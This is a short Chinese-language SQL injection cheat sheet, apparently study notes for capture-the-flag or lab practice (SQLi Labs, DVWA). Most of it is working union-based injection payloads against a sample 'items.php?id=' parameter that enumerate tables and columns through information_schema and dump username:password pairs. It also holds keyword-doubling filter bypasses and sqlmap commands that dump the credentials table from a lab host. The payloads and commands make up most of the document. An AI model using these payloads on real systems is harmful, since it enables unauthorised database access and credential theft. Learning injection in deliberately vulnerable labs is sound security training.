# SQL注入

* ### 注入尝试

```
http://newspaper.com/items.php?id=2 //正常回显
http://newspaper.com/items.php?id=2 and 1=2 //提示报错或者未搜索到
http://newspaper.com/items.php?id=2 and 1=1 //正常回显
```

则可以执行注入，注入点为?id=

* ### 开始注入

Payload构造：

```
id=2'; show database;#
id=-1' order by 1#   //利用order by 1/2/3/4 查询列数
id=-1' union select 1,2,3,4,...,n#   //联合注入查看返回值（n为order by已确定的列数）
id=-1' union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database()#   //爆database里面的表
id=-1' union select 1,2,group_concat(column_name) from information_schema.columns where table_name='users'#    //爆users表里面的字段
id=-1' union select 1,2,group_concat(username,0x3a,password) from users#    //爆值，最后输出以username:password格式输出
```

```
Information_schema.tables //存储了数据库中所有的表信息
Information_schema.columns where table_name = ‘a’  //存储了数据库内部表a中所有的字段信息
```

* ### 盲注
* ### Bypass

有一些题目中不需要用单引号闭合直接进行执行

一些题目中需要单引号加括号应对\('id'\)语句

一些题目中需要进行双引号加括号 --&gt; \("id"\)

或者双写绕过

```
union select --> uniunionon selselectect
```

* ### SQLMAP

sqlmap语句

```
python sqlmap.py -u 10.101.143.198/sqli-labs/Less-1/?id=1 --technique UE --dbms mysql -D security(数据库名) --tables --batch -v 0    //爆表
python sqlmap.py -u 10.101.143.198/sqli-labs/Less-1/?id=1 --technique UE --dbms mysql -D security -T users（表名） --columns --batch -v 0    //爆字段
python sqlmap.py -u 10.101.143.198/sqli-labs/Less-1/?id=1 --technique UE --dbms mysql -D security -T users -C username,password（字段名） --dump --batch -v 0    //爆值
```

* #### 推荐练习环境
* SQLi Labs

* DVWA



